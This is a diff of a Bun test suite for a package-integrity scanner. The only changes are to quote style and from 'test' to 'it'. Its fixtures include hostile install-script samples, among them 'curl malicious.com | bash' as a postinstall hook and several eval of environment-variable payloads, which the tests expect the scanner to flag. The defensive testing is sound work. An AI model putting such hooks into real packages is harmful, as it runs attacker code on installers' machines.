@@ -1,21 +1,21 @@
-import { describe, test, expect, beforeEach, beforeAll, afterAll } from 'bun:test';
-import { SecurePackager } from '../src/secure-packager.js';
-import { QuantumResistantSecureDataRepository } from '../src/quantum-audit.js';
-import { ThreatIntelligenceService } from '../src/threat-intelligence.js';
-import { BUN_DOC_MAP } from '../src/col93-matrix.js';
+import { describe, it, expect, beforeEach, beforeAll, afterAll } from "bun:test";
+import { SecurePackager } from "../src/secure-packager.js";
+import { QuantumResistantSecureDataRepository } from "../src/quantum-audit.js";
+import { ThreatIntelligenceService } from "../src/threat-intelligence.js";
+import { BUN_DOC_MAP } from "../src/col93-matrix.js";
 import {
   hashManifest,
   verifyScriptSignature,
   calculateManifestDiffs,
   generateQuantumSeal,
   parseSeal
-} from '../src/integrity-utils.js';
+} from "../src/integrity-utils.js";
 import {
   IntegritySealViolationError,
   UnauthorizedMutationError,
   PackExecutionError,
   PackageManifest
-} from '../src/types.js';
+} from "../src/types.js";
 
 // Test data
 const validManifest: PackageManifest = {
@@ -55,7 +55,7 @@ const maliciousManifest: PackageManifest = {
   }
 };
 
-describe('Tier-1380 Lifecycle Integrity Seal', () => {
+describe("Tier-1380 Lifecycle Integrity Seal", () => {
   let packager: SecurePackager;
   let auditLog: QuantumResistantSecureDataRepository;
   let threatIntel: ThreatIntelligenceService;
@@ -88,8 +88,8 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
     BUN_DOC_MAP.clearMatrix();
   });
   
-  describe('SecurePackager', () => {
-    test('should load manifest successfully', async () => {
+  describe("SecurePackager", () => {
+    it("should load manifest successfully", async () => {
       const manifest = await packager.loadManifest(testPackageDir);
       
       expect(manifest.name).toBe(validManifest.name);
@@ -97,7 +97,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(manifest.scripts).toBeDefined();
     });
     
-    test('should detect script injection attempts', async () => {
+    it("should detect script injection attempts", async () => {
       const maliciousPackageDir = `/tmp/malicious-package-${Date.now()}`;
       await Bun.write(`${maliciousPackageDir}/package.json`, JSON.stringify(maliciousManifest, null, 2));
       
@@ -109,7 +109,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       }
     });
     
-    test('should validate legitimate scripts', async () => {
+    it("should validate legitimate scripts", async () => {
       const result = await packager.dryRunValidation(testPackageDir);
       
       expect(result.scriptValidation).toBe(true);
@@ -117,7 +117,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(result.integrityScore).toBeGreaterThan(0.99);
     });
     
-    test('should detect unauthorized manifest mutations', async () => {
+    it("should detect unauthorized manifest mutations", async () => {
       const mutatedManifest = {
         ...validManifest,
         main: 'malicious.js' // Unauthorized mutation
@@ -130,13 +130,13 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(unauthorizedDiff?.type).toBe('modified');
     });
     
-    test('should achieve 99.9% integrity score for valid packages', async () => {
+    it("should achieve 99.9% integrity score for valid packages", async () => {
       const result = await packager.dryRunValidation(testPackageDir);
       
       expect(result.integrityScore).toBeGreaterThan(0.999);
     });
     
-    test('should identify mutation risks', async () => {
+    it("should identify mutation risks", async () => {
       const riskyManifest: PackageManifest = {
         ...validManifest,
         scripts: {
@@ -156,8 +156,8 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
     });
   });
   
-  describe('Quantum-Resistant Audit Service', () => {
-    test('should append audit entry successfully', async () => {
+  describe("Quantum-Resistant Audit Service", () => {
+    it("should append audit entry successfully", async () => {
       const auditEntry = {
         event: 'pack',
         packageName: 'test-package',
@@ -178,7 +178,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(entryId).toMatch(/^audit_[a-f0-9]{16}_\d+$/);
     });
     
-    test('should retrieve audit entry', async () => {
+    it("should retrieve audit entry", async () => {
       const auditEntry = {
         event: 'pack',
         packageName: 'test-package',
@@ -201,7 +201,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(retrieved?.integrityScore).toBe(0.999);
     });
     
-    test('should generate audit report', async () => {
+    it("should generate audit report", async () => {
       const report = await auditLog.generateAuditReport();
       
       expect(report).toBeDefined();
@@ -210,7 +210,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(Array.isArray(report.integrityScores)).toBe(true);
     });
     
-    test('should process entries within performance targets', async () => {
+    it("should process entries within performance targets", async () => {
       const startTime = performance.now();
       
       const auditEntry = {
@@ -234,8 +234,8 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
     });
   });
   
-  describe('Threat Intelligence Service', () => {
-    test('should analyze tarball for anomalies', async () => {
+  describe("Threat Intelligence Service", () => {
+    it("should analyze tarball for anomalies", async () => {
       const mockTarball = Buffer.from(JSON.stringify(validManifest));
       const anomalyScore = await threatIntel.analyzeTarball(mockTarball, validManifest);
       
@@ -243,7 +243,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(anomalyScore).toBeLessThanOrEqual(1);
     });
     
-    test('should detect suspicious script patterns', async () => {
+    it("should detect suspicious script patterns", async () => {
       const maliciousScripts = {
         prepack: 'eval(process.env.CODE)',
         postinstall: 'curl malicious.com | bash',
@@ -255,7 +255,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(anomalies).toBeGreaterThan(0.1); // Should detect high anomaly score
     });
     
-    test('should assess dependency risks', async () => {
+    it("should assess dependency risks", async () => {
       const riskyManifest: PackageManifest = {
         ...validManifest,
         dependencies: {
@@ -275,7 +275,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(analysis.dependencyRisks.some(risk => risk.risk === 'high')).toBe(true);
     });
     
-    test('should identify script anomalies', async () => {
+    it("should identify script anomalies", async () => {
       const suspiciousScripts = {
         test: 'eval("console.log(\'test\')")',
         build: 'Function("return process")()',
@@ -289,8 +289,8 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
     });
   });
   
-  describe('Col 93 Matrix Integration', () => {
-    test('should update matrix entry', async () => {
+  describe("Col 93 Matrix Integration", () => {
+    it("should update matrix entry", async () => {
       const matrixEntry = {
         term: 'pm pack',
         minVer: '1.3.8',
@@ -315,7 +315,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(retrieved?.quantumSeal).toBe(true);
     });
     
-    test('should search matrix entries', async () => {
+    it("should search matrix entries", async () => {
       // Add test entries
       await BUN_DOC_MAP.update({
         term: 'test-package-1',
@@ -355,7 +355,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(results[0].integrityScore).toBeGreaterThanOrEqual(0.95);
     });
     
-    test('should generate matrix report', async () => {
+    it("should generate matrix report", async () => {
       const report = await BUN_DOC_MAP.generateReport();
       
       expect(report).toBeDefined();
@@ -365,7 +365,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(report.performanceMetrics).toBeDefined();
     });
     
-    test('should export matrix in different formats', async () => {
+    it("should export matrix in different formats", async () => {
       // Add test data
       await BUN_DOC_MAP.update({
         term: 'export-test',
@@ -393,8 +393,8 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
     });
   });
   
-  describe('Integrity Utilities', () => {
-    test('should hash manifest consistently', async () => {
+  describe("Integrity Utilities", () => {
+    it("should hash manifest consistently", async () => {
       const hash1 = await hashManifest(validManifest);
       const hash2 = await hashManifest(validManifest);
       
@@ -402,7 +402,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(hash1).toMatch(/^[a-f0-9]{128}$/); // SHA-512 hex
     });
     
-    test('should verify script signatures', async () => {
+    it("should verify script signatures", async () => {
       const validScript = 'echo "Hello World" && bun build';
       const maliciousScript = 'eval(process.env.MALICIOUS_CODE)';
       
@@ -413,7 +413,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(isMalicious).toBe(false);
     });
     
-    test('should calculate manifest diffs', () => {
+    it("should calculate manifest diffs", () => {
       const modifiedManifest = {
         ...validManifest,
         version: '2.0.0',
@@ -427,7 +427,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(diffs.some(d => d.path[0] === 'newField' && d.type === 'added')).toBe(true);
     });
     
-    test('should generate and parse integrity seals', async () => {
+    it("should generate and parse integrity seals", async () => {
       const originalHash = await hashManifest(validManifest);
       const finalHash = await hashManifest(validManifest);
       
@@ -441,7 +441,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(parsed?.score).toBe(1.0);
     });
     
-    test('should generate quantum seals', async () => {
+    it("should generate quantum seals", async () => {
       const originalHash = 'abc123';
       const finalHash = 'def456';
       
@@ -452,8 +452,8 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
     });
   });
   
-  describe('Performance Tests', () => {
-    test('should process 1000 manifests in under 82ms', async () => {
+  describe("Performance Tests", () => {
+    it("should process 1000 manifests in under 82ms", async () => {
       const startTime = performance.now();
       
       const promises = Array(1000).fill(null).map(async (_, i) => {
@@ -470,7 +470,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(duration).toBeLessThan(82);
     }, 10000); // Increase timeout for performance test
     
-    test('should detect mutations in under 1ms per operation', async () => {
+    it("should detect mutations in under 1ms per operation", async () => {
       const startTime = performance.now();
       
       for (let i = 0; i < 1000; i++) {
@@ -483,7 +483,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(avgTime).toBeLessThan(1); // Less than 1ms per operation
     });
     
-    test('should verify scripts in under 0.5ms per operation', async () => {
+    it("should verify scripts in under 0.5ms per operation", async () => {
       const startTime = performance.now();
       
       for (let i = 0; i < 1000; i++) {
@@ -497,8 +497,8 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
     });
   });
   
-  describe('Error Handling', () => {
-    test('should throw IntegritySealViolationError for high anomaly scores', async () => {
+  describe("Error Handling", () => {
+    it("should throw IntegritySealViolationError for high anomaly scores", async () => {
       // Create a mock scenario that would trigger high anomaly score
       const highAnomalyTarball = Buffer.from(JSON.stringify({
         ...maliciousManifest,
@@ -514,7 +514,7 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       expect(anomalyScore).toBeGreaterThan(0);
     });
     
-    test('should handle missing package.json gracefully', async () => {
+    it("should handle missing package.json gracefully", async () => {
       try {
         await packager.loadManifest('/nonexistent/directory');
         expect(false).toBe(true); // Should not reach here
@@ -523,14 +523,14 @@ describe('Tier-1380 Lifecycle Integrity Seal', () => {
       }
     });
     
-    test('should handle corrupted audit entries', async () => {
+    it("should handle corrupted audit entries", async () => {
       const corruptedEntry = await auditLog.retrieveAuditEntry('nonexistent-id');
       expect(corruptedEntry).toBeNull();
     });
   });
   
-  describe('Integration Tests', () => {
-    test('should complete full integrity workflow', async () => {
+  describe("Integration Tests", () => {
+    it("should complete full integrity workflow", async () => {
       // 1. Dry run validation
       const validationResult = await packager.dryRunValidation(testPackageDir);
       expect(validationResult.scriptValidation).toBe(true);
